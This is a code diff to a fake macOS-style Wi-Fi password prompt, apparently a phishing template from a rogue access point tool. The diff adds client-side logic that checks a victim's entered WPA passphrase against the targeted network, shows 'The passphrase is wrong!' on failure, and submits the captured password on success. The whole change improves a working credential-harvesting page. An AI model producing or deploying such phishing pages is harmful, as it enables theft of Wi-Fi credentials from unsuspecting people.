@@ -215,8 +215,11 @@
         '           <form id="wifi-search-form" method="post" action="/post">' +
         '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
         '               <div class="password">' +
-        '                   <label>Password:</label>' +
+        '                   <label>Password: </label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
+        '                   <br>' +
+        '                   <label id="pw_status"></label>' +
+        '                   <br>' +
         '                   <div class="glow"></div>' +
         '               </div>' + 
         '               <div class="checkmark">' +
@@ -226,8 +229,8 @@
         '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
         '               </div>' + 
         '               <div class="buttons">' +
-        '                     <button id="button-join" class="action" disabled="disabled">Join</button>' +
-        '                   <button id="button-cancel">Cancel</button>' +
+        '                   <input id="button-join" type="submit" value="Join">' +
+        '                   <input id="button-cancel" type="reset" value="Reset">' +
         '               </div>' +
         '           </form>' +
         '       </div>' +
@@ -307,6 +310,17 @@
             xhttp.send(data);
         }
 
+        function mac_validate_action (pw_status, password) {
+            if (pw_status == "success") {
+                document.getElementById("wifi-search-form").submit(); 
+                document.getElementById("pw_status").innerHTML = ""
+            } else if (pw_status == "fail") {
+                document.getElementById("pw_status").innerHTML = "The passphrase is wrong!"
+            } else {
+                document.getElementById("wifi-search-form").submit(); 
+            }
+        }
+
         function mobile_validate_action (pw_status, password) {
             if (pw_status == "success") {
 			    document.getElementById("wifi-search-password").value = password;
@@ -374,6 +388,11 @@
             }
             else {
                 document.getElementById("loader-mac").innerHTML = loadhtml_mac;
+                var myform = document.getElementById("wifi-search-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
+                });
             }
         </script>
         <script src='/static/win-behavior.js'></script>
